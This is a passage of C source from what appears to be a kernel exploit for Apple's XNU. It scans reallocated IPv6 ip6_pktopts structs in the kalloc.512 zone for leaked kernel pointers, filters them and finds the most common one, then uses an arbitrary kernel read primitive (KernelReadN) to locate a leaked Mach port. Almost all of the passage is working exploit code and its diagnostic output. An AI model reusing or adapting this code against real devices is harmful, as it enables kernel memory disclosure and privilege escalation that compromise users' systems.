        if(prefer_tempaddr != IP6PO_TEMPADDR_PREFER && prefer_tempaddr != 0xdeadbeef){
            if(FIND_EVIL_SOCKET_DEBUG){
                if(1){
                    if(FIND_EVIL_SOCKET_DEBUG_LEVEL1){
                        printf("socket %d prefer_tempaddr %#x\n", i, prefer_tempaddr);
                    }
                }
                else{
                    zero_prefer_tempaddrs++;
                }
            }
        }

        if(/*i>1600 &&*/ tclass != 0xdeadbeef && minmtu != 0xdeadbeef && prefer_tempaddr != 0xdeadbeef){
            uint64_t b0b4 = ((uint64_t)tclass << 32) | minmtu;
            uint64_t b4b0 = ((uint64_t)minmtu << 32) | tclass;
            uint64_t b4b8 = ((uint64_t)minmtu << 32) | prefer_tempaddr;
            uint64_t b8b4 = ((uint64_t)prefer_tempaddr << 32) | minmtu;

            /* printf("socket %d: b0|b4: %#llx b4|b0: %#llx b4|b8: %#llx" */
            /*         " b8|b4: %#llx\n", i, b0b4, b4b0, b4b8, b8b4); */

            uint64_t mask = 0xffffffe000000000;
            uint64_t result = 0xffffffe000000000;

            if((b0b4 & mask) == result){
                if(minmtu != 0)
                    array_insert(kernel_pointer_array, b0b4);
            }
            if((b4b0 & mask) == result){
                if(tclass != 0)
                    array_insert(kernel_pointer_array, b4b0);
            }
            if((b4b8 & mask) == result){
                if(prefer_tempaddr != 0)
                    array_insert(kernel_pointer_array, b4b8);
            }
            if((b8b4 & mask) == result){
                if(minmtu != 0)
                    array_insert(kernel_pointer_array, b8b4);
            }

            /* struct in6_pktinfo info = {0}; */
            /* socklen_t infosz = sizeof(info); */

/*             if(i > 1500){ */
/*                 int err = getsockopt(sockets[i], IPPROTO_IPV6, IPV6_PKTINFO, &info, &infosz); */

/*                 if(err != -1){ */
/*                     printf("socket %d IPV6_PKTINFO:\n", i); */
/*                     DumpHex(&info, sizeof(info)); */
/*                 } */
/*             } */
        }

    }

    if(FIND_EVIL_SOCKET_DEBUG_LEVEL1){
        /* printf("An additional %d ip6_pktopts struct(s) got reallocated, but" */
        /*         " had tclass == 0 (output suppressed)\n", zero_tclasses); */
        /* printf("An additional %d ip6_pktopts struct(s) got reallocated, but" */
        /*         " had minmtu == 0 (output suppressed)\n", zero_minmtus); */
        /* printf("An additional %d ip6_pktopts struct(s) got reallocated, but" */
        /*         " had prefer_tempaddr == 0 (output suppressed)\n", */
        /*         zero_prefer_tempaddrs); */
    }

    if(evil_socket == -1){
        printf("Couldn't reallocate a controlled ip6_pktopts struct in kalloc.512\n");
        CLEANUP;
        return 1;
    }

    int minmtu = 0;
    if(get_minmtu(evil_socket, &minmtu)){
        printf("Couldn't read minmtu from evil_socket? %s\n", strerror(errno));
        CLEANUP;
        return 1;
    }

    printf("Got a controlled ip6_pktopts struct in kalloc.512, minmtu: %#x\n", minmtu);
    printf("Evil socket: %d\n", evil_socket);

    array_qsort(kernel_pointer_array, kptr_compar);

    /* printf("kptrs:\n"); */
    /* for(int i=0; i<kernel_pointer_array->len; i++){ */
    /*     uint64_t kaddr = kernel_pointer_array->items[i]; */
    /*     printf("%d. %#llx\n", i, kaddr); */
    /* } */

    printf("Eliminating (what looks like) bad kernel pointers...\n");
    int kptrs_eliminated = 0;
    int kptr_idx = 0;

    // XXX lazy to manage the stupidness of deleting and adjusting counter var
    /* struct array *bad_kptrs = array_new(); */

    for(int i=0; i<kernel_pointer_array->len; i++){
        uint64_t kaddr = kernel_pointer_array->items[i];

        // XXX note: yes, that's 9 f's
        uint64_t determiner = kaddr & 0xfffffffff;
        int del = 0;

        if(determiner > 0x100000000){
            del = 1;
        }
        if(determiner < 0x10000){//0x1000000){
            del = 1;
        }


        if(del){
            printf("deleting %#llx\n", kaddr);
            kernel_pointer_array->items[i] = 0;
            /* array_remove(kernel_pointer_array, i); */
            /* i--; */
            /* array_insert(bad_kptrs, kaddr); */
            /* don't increment idx here because mem got shifted down */
        }
        /* else{ */
        /*     kptr_idx++; */
        /* } */
        /* printf("%d. %#llx\n", i, kaddr); */
    }

    /* printf("kptrs:\n"); */
    /* for(int i=0; i<kernel_pointer_array->len; i++){ */
    /*     uint64_t kaddr = kernel_pointer_array->items[i]; */
    /*     printf("%d. %#llx\n", i, kaddr); */
    /* } */

    printf("Looking for a Mach port pointer from the kalloc.512 OOL allocations"
            " we did earlier...\n");

    uint64_t leaked_port_kaddr = 0;

    uint64_t mode_kaddr = 0;
    int max_occurences = 0;

    for(int i=0; i<kernel_pointer_array->len; i++){
        uint64_t cur_kaddr = kernel_pointer_array->items[i];
        // XXX "deleted" kaddr
        if(cur_kaddr == 0)
            continue;

        int occurences = 0;

        for(int j=0; j<kernel_pointer_array->len; j++){
            if(kernel_pointer_array->items[j] == cur_kaddr){
                occurences++;
            }
        }

        if(occurences > max_occurences){
            /* printf("New most frequent kaddr %#llx with %d occurences\n", */
            /*         cur_kaddr, occurences); */
            mode_kaddr = cur_kaddr;
            max_occurences = occurences;
        }
    }

    if(mode_kaddr == 0){
        printf("Something went wrong while trying to find the mode of kptr array\n");
        CLEANUP;
        return 1;
    }

    printf("Most frequent kernel pointer is %#llx with %d occurences "
            "(if it isn't from the OOL allocations we'll probably panic)\n",
            mode_kaddr, max_occurences);

    /* printf("3 seconds until testing kernel reads with the kptrs we got\n"); */
    sleep(1);


    errno = 0;
    kport_t kport = {0};
    int ret = KernelReadN(mode_kaddr, &kport, sizeof(kport));

    if(ret){
        printf("Kernel read @ %#llx failed: %s\n", mode_kaddr, strerror(errno));
    }
    else{
        if(kport.ip_context == LEAKED_PORT_CONTEXT){
            leaked_port_kaddr = mode_kaddr;
        }
    }

    /* for(int i=0; i<kernel_pointer_array->len; i++){ */
    /*     uint64_t kaddr = kernel_pointer_array->items[i]; */
    /*     if(kaddr == 0) */
    /*         continue; */
    /*     printf("Kernel pointer %d: %#llx\n", i, kaddr); */

    /* kport_t kport = {0}; */
    /* int ret = KernelReadN(mode_kaddr, &kport, sizeof(kport)); */

    /* if(ret){ */
    /*     printf("Kernel read %d @ %#llx failed\n", i, kaddr); */
    /* } */
    /* else{ */
    /*     if(kport.ip_context == LEAKED_PORT_CONTEXT){ */
    /*         leaked_port_kaddr = mode_kaddr; */
    /*         break; */
    /*     } */
    /* } */

    /*     sleep(1); */
    /* } */

    if(leaked_port_kaddr == 0){
        printf("Couldn't find a Mach port\n");
        CLEANUP;
        return 1;
    }

    printf("Found Mach port @ %#llx\n", leaked_port_kaddr);


    for(int i=0; i<num_pipes; i++){
        if(pipes[i] != evil_pipe){
            close(*pipes[i]);
            close(*(pipes[i] + 1));
            free(pipes[i]);
        }
    }

    for(int i=0; i<num_sockets; i++){
        if(sockets[i] != evil_socket)
            close(sockets[i]);
    }

    return 0;
}
